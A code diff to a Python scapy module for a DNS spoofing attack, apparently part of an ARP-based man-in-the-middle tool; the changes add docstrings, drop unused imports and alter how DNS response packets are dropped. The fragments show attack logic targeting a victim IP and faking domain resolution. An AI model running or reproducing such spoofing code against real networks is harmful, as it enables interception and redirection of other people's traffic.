@@ -1,11 +1,12 @@
 from scapy.all import *
 from arp import * 
 from helper import *
-import traceback
-import subprocess
 import os
 
 class dns:
+    """
+    Class to run a DNS spoofing attack
+    """
     def __init__(self):
         self.stop_event = threading.Event()
         
@@ -13,7 +14,7 @@ class dns:
     def set_ip_forwarding(ip_forwarding, interface):
         """
         Sets the ip forwarding setting, enable or disable it
-        Also adds or deletes the correct firewall forwarding rules
+        Also adds or deletes the correct iptables rules
         """
         if ip_forwarding:
             print("Enabling IP forwarding")
@@ -92,12 +93,15 @@ class dns:
                 # Request is for domain that should not be spoofed so get legitimate IP
                 dns.request_domain(query_domain, packet)
                 
-        elif packet.haslayer(DNS) and packet.getlayer(DNS).qr == 1:
+        else:
             # Packet is a DNS response packet
-            # Unexpected, so drop
+            # Could be from uncaught request, so drop
             pass
                  
     def start(self, interface, domain, victim_ip, spoofed_ip):
+        """
+        Start a DNS spoofing attack
+        """
         self.stop_event.clear()
         print("Starting a DNS spoof for victim %s, pretending %s is at %s" % (victim_ip, domain, spoofed_ip))
         dns.set_ip_forwarding(True, interface)
@@ -115,6 +119,9 @@ class dns:
         print("DNS spoofing stopped")
     
     def stop(self):
+        """
+        Stop a running DNS attack
+        """
         self.stop_event.set()
             
             
